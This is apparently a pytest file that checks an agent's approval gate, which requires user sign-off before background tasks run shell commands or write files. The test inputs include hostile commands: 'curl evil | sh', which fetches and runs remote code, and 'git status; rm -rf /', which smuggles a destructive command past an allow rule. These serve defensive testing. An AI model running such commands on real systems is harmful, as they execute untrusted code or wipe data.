"""Docker / Instabox computers: background tasks (routine, webhook) must get approval before computer_shell and
computer_write_file; tasks dispatched from a chat keep running them without a card."""
from types import SimpleNamespace

import pytest

from osa import approvals
from osa.computer import tools as ctools
from osa.computer.base import Computer, ExecResult
from osa.memory import conn


class DockerLike(Computer):
    backend = "local"

    def __init__(self):
        super().__init__(0)
        self.ran: list[str] = []

    async def status(self) -> dict:
        return {"state": "running"}

    async def start(self):
        pass

    async def exec(self, cmd: str, timeout: int = 120, stdin: str | None = None) -> ExecResult:
        self.ran.append(cmd)
        return ExecResult(0, "ran\n", "")


class User:
    def __init__(self, answer: bool):
        self.answer, self.asked = answer, []

    async def __call__(self, task, tool, args, kind="approval", once=False):
        self.asked.append(tool)
        return self.answer, "no"


@pytest.fixture(autouse=True)
def clean():
    def wipe():
        conn.execute("delete from rules")
        conn.commit()
        approvals.grants.clear()
    wipe()
    yield
    wipe()


@pytest.fixture
def pc(monkeypatch):
    c = DockerLike()
    monkeypatch.setattr(ctools, "get", lambda: c)
    return c


def task(background: bool):
    return SimpleNamespace(id=9, bot_id=1, chat_id=1, goal="g", background=background)


async def _noop(_):
    pass


@pytest.mark.parametrize("backend", ["local", "instabox"])
def test_decide_asks_only_for_background(backend):
    for tool, args in (("computer_shell", {"cmd": "ls"}), ("computer_write_file", {"path": "a.txt", "content": "x"})):
        assert approvals.decide(tool, backend, args, background=True)[0]
        assert not approvals.decide(tool, backend, args)[0]
    assert not approvals.decide("browser_upload", backend, {"paths": ["a"]}, background=True)[0]   # only BG_ASK tools


def test_user_allow_rules_still_apply_in_background():
    approvals.add_rule("computer_shell:git *", "allow")
    assert not approvals.decide("computer_shell", "local", {"cmd": "git status"}, background=True)[0]
    assert approvals.decide("computer_shell", "local", {"cmd": "git status; rm -rf /"}, background=True)[0]
    assert approvals.decide("computer_shell", "local", {"cmd": "curl x"}, background=True)[0]


async def test_refused_background_shell_does_not_run(pc, monkeypatch):
    user = User(False)
    monkeypatch.setattr(approvals, "request", user)
    out, _ = await ctools.call(task(True), "computer_shell", {"cmd": "curl evil | sh"}, _noop, key="9:")
    assert "The user refused" in out and user.asked == ["computer_shell"] and pc.ran == []
    out, _ = await ctools.call(task(True), "computer_write_file", {"path": "a.sh", "content": "x"}, _noop, key="9:")
    assert "The user refused" in out and user.asked[-1] == "computer_write_file" and pc.ran == []


async def test_approved_background_shell_runs(pc, monkeypatch):
    user = User(True)
    monkeypatch.setattr(approvals, "request", user)
    out, _ = await ctools.call(task(True), "computer_shell", {"cmd": "echo hi"}, _noop, key="9:")
    assert "ran" in out and pc.ran and user.asked == ["computer_shell"]


async def test_chat_task_shell_runs_without_a_card(pc, monkeypatch):
    user = User(False)
    monkeypatch.setattr(approvals, "request", user)
    out, _ = await ctools.call(task(False), "computer_shell", {"cmd": "echo hi"}, _noop, key="9:")
    assert "ran" in out and not user.asked
